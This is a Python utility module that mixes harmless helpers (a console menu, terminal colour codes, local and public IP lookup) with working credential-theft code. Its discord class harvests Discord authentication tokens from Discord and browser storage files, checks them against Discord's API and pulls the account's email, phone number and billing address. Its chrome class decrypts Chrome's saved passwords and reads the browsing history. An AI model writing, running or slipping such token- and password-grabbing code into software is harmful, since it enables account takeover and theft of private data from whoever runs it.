import os
import socket
import requests
import platform
import getpass
import GPUtil
import re
import random

import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def help():
    print('''utils():
    menu(['List', 'of', 'selections'])
    clear_screen()
    wait_key()

    computertools():
    get_local_ip()
    get_public_ip()
    get_pc_name()
    get_username()
    get_gpu_temp()

    bcolors:
    ''' + bcolors.HEADER + '''HEADER
    ''' + bcolors.OKBLUE + '''OKBLUE
    ''' + bcolors.OKCYAN + '''OKCYAN
    ''' + bcolors.OKGREEN + '''OKGREEN
    ''' + bcolors.WARNING + '''WARNING
    ''' + bcolors.FAIL + '''FAIL
    ''' + bcolors.BOLD + '''BOLD
    ''' + bcolors.UNDERLINE + '''UNDERLINE
    ''' + bcolors.ENDC + '''ENDC

    discord():
    GetToekns()
    GetUsername(token)
    GetUserId(token)
    GetEmail(token)
    GetPhoneNumber(token)
    BillingCheck(token)
    VerifiedCheck(token)
    NitroCheck(token)
    GetLocale(token)

    chrome():
    get_history()
    chrome_data_and_time(chrome_data)
    fetching_encryption_key()
    password_decryption(password, encryption_key)
    get_passwords()''')

class utils():
    def clear_screen():
        """
        Function to clear the screen.
        """
        os.system("cls")

    def wait_key():
        ''' Wait for a key press on the console and return it. '''
        result = None
        if os.name == 'nt':
            import msvcrt
            result = msvcrt.getwch()
        else:
            import termios
            fd = sys.stdin.fileno()

            oldterm = termios.tcgetattr(fd)
            newattr = termios.tcgetattr(fd)
            newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
            termios.tcsetattr(fd, termios.TCSANOW, newattr)

            try:
                result = sys.stdin.read(1)
            except IOError:
                pass
            finally:
                termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)

        return result

    def menu(items):
        """
        Function to display a menu and allow the user to choose an item using "w" to go up and "s" to go down,
        and "enter" to select an item.
        """
        selected = 0
        while True:
            utils.clear_screen()
            for i in range(len(items)):
                if i == selected:
                    print(f"> {items[i]}")
                else:
                    print(f"  {items[i]}")
            key = utils.wait_key()
            if key == "w":  # Up arrow
                selected = (selected - 1) % len(items)
            elif key == "s":  # Down arrow
                selected = (selected + 1) % len(items)
            elif key == "d":  # Enter
                return selected
            else:
                print('Pres "s" to go down,\n"w" to go up\n"d" to select the element.')
                os.system('pause')
        
class computertools():
    def get_local_ip():
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    
    def get_public_ip():
        endpoint = 'https://ipinfo.io/json'
        response = requests.get(endpoint, verify = True)

        if response.status_code != 200:
            return 'Status:', response.status_code, 'Problem with the request. Exiting.'
            exit()

        data = response.json()

        return data['ip']

    def get_pc_name():
        return platform.node()

    def get_username():
        return getpass.getuser()

    def get_gpu_temp():
        gpu = GPUtil.getGPUs()[0]
        return gpu.temperature

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class discord():
    def GetTokens():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        ldb = '\\Local Storage\\leveldb'
        paths = {
            'Discord': roaming + '\\Discord' ,
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
        }
        grabbed = {}
        token_ids = []
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            tokens = []
            for file_name in os.listdir(path + ldb):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token in tokens:
                                pass
                            else:
                                response = requests.post(f'https://discord.com/api/v6/invite/{random.randint(1,9999999)}', headers={'Authorization': token})
                                if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
                                    pass
                                else:
                                    tokenid = token[:24]
                                    if tokenid in token_ids:
                                        pass
                                    else:
                                        token_ids.append(tokenid)
                                        tokens.append(token)
            if len(tokens) > 0:
                grabbed[platform] = tokens
        return grabbed

    def GetUsername(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()

        username = f'{info["username"]}#{info["discriminator"]}'
        return username


    def GetUserId(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        userid = info['id']
        return userid

    def GetEmail(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        email = info['email']
        return email

    def GetPhoneNumber(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        phone_number = info['phone']
        return phone_number

    def VerifiedCheck(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        verified = info['verified']
        verified = bool(verified)
        return verified

    def BillingCheck(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        print(info)
        if len(info) > 0:
            billing_info = []

            addr = info[0]['billing_address']

            name = addr['name']
            billing_info.append(name)

            address_1 = addr['line_1']
            billing_info.append(address_1)

            address_2 = addr['line_2']
            billing_info.append(address_2)

            city = addr['city']
            billing_info.append(city)

            postal_code = addr['postal_code']
            billing_info.append(postal_code)

            state = addr['state']
            billing_info.append(state)

            country = addr['country']
            billing_info.append(country)

            print(billing_info)

            return True, billing_info
        else:
            return False, info

    def NitroCheck(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }


        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)
        if has_nitro:
            has_nitro = True
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((start - end).days)

            return has_nitro, start, end, days_left
        else:
            has_nitro = False
            return has_nitro, nitro_data

    def GetLocale(token):
        languages = {
            'da'    : 'Danish, Denmark',
            'de'    : 'German, Germany',
            'en-GB' : 'English, United Kingdom',
            'en-US' : 'English, United States',
            'es-ES' : 'Spanish, Spain',
            'fr'    : 'French, France',
            'hr'    : 'Croatian, Croatia',
            'lt'    : 'Lithuanian, Lithuania',
            'hu'    : 'Hungarian, Hungary',
            'nl'    : 'Dutch, Netherlands',
            'no'    : 'Norwegian, Norway',
            'pl'    : 'Polish, Poland',
            'pt-BR' : 'Portuguese, Brazilian, Brazil',
            'ro'    : 'Romanian, Romania',
            'fi'    : 'Finnish, Finland',
            'sv-SE' : 'Swedish, Sweden',
            'vi'    : 'Vietnamese, Vietnam',
            'tr'    : 'Turkish, Turkey',
            'cs'    : 'Czech, Czechia, Czech Republic',
            'el'    : 'Greek, Greece',
            'bg'    : 'Bulgarian, Bulgaria',
            'ru'    : 'Russian, Russia',
            'uk'    : 'Ukranian, Ukraine',
            'th'    : 'Thai, Thailand',
            'zh-CN' : 'Chinese, China',
            'ja'    : 'Japanese',
            'zh-TW' : 'Chinese, Taiwan',
            'ko'    : 'Korean, Korea'
        }


        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        info = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        locale = info['locale']
        language = languages.get(locale)

        return locale, language

class chrome():
    def get_history():
        ch = os.path.join(os.getenv('LOCALAPPDATA'),"\\Google\\Chrome\\User Data\\Default\\History")
        con = sqlite3.connect(ch)
        cursor = con.cursor()
        cursor.execute("SELECT url FROM urls")
        urls = cursor.fetchall()
        return '\n'.join(urls)

    def chrome_date_and_time(chrome_data):
        # Chrome_data format is 'year-month-date 
        # hr:mins:seconds.milliseconds
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    
    
    def fetching_encryption_key():
        # Local_computer_directory_path will look 
        # like this below
        # C: => Users => <Your_Name> => AppData =>
        # Local => Google => Chrome => User Data =>
        # Local State
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    
        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    
    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            
            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
    
    
    def get_passwords():
        a = ""
        key = chrome.fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)
        
        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = chrome.password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]
            
            if user_name or decrypted_password:
                a = a + f"Main URL: {main_url}\n"
                a = a + f"Login URL: {login_page_url}\n"
                a = a + f"User name: {user_name}\n"
                a = a + f"Decrypted Password: {decrypted_password}\n"
            
            else:
                continue
            
            if date_of_creation != 86400000000 and date_of_creation:
                a = a + f"Creation date: {str(chrome.chrome_date_and_time(date_of_creation))}\n"
            
            if last_usuage != 86400000000 and last_usuage:
                a = a + f"Last Used: {str(chrome.chrome_date_and_time(last_usuage))}\n"
            a = a + "=" * 100 + "\n"
        cursor.close()
        db.close()
        
        try:
            
            # trying to remove the copied db file as 
            # well from local computer
            os.remove(filename)
        except:
            pass
        return a